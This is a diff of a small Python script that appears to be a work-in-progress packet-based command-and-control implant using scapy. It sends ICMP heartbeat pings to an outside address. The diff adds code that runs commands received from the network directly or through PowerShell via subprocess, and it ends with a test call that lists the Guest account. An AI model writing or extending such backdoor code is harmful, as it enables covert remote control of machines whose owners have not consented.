@@ -1,7 +1,7 @@
 import time
 import threading
+import subprocess as sp #Going to need this for executing commmands
 from scapy.all import *
-
 cmn_cmds = []
 
 
@@ -14,24 +14,32 @@ def cmd_mon(pkt):
 
 
 def cmd_proc(cmd):
-    if (cmd[0] == "a"):
-        if (cmd[1] == "c"):
+    prefix = cmd[0]
+    term = cmd[1]
+    cmd = cmd[3::]
+    if (prefix == "a"):
+        if (term == "c"):
             print("A")
-        elif (cmd[1] == "p"):
+        elif (term == "p"):
             print("A")
-    elif (cmd[0] == "e"):
-        if (cmd[1] == "c"):
-            print("e")
-        elif (cmd[1] == "p"):
-            print("e")
+    elif (prefix == "e"):
+        if (term == "c"):
+            cmd = cmd.split(" ")
+            sp.run(cmd)
+        elif (term == "p"):
+            cmd = cmd.split(" ")
+            cmd.insert(0,"powershell")
+            sp.run(cmd)
 
 
 def heart():
+    n = 1
     print("TheLoaded RICK")
-    while True:
-        sr1(IP(dst="192.168.1.135" / ICMP() / "test"))
-        print("BEAT")
-        time.sleep(60)
+    #while True:
+    sr1(IP(dst="1.1.1.1")/ ICMP() / "test")
+    print("BEAT" + str(n))
+    n += 1
+    #time.sleep(15)
 
 
 def sniffer():
@@ -40,12 +48,10 @@ def sniffer():
 
 def main():
     t1 = threading.Thread(target=heart)
-    t2 = threading.Thread(target=sniffer)
+    #t2 = threading.Thread(target=sniffer)
     t1.start()
-    t2.start()
+    #t2.start()
     t1.join()
-    t2.join()
+    #t2.join()
 
-
-sr1(IP(dst="192.168.1.135" / ICMP() / "test"))
-print("BEAT")
+cmd_proc("ep Get-LocalUser -Name Guest")
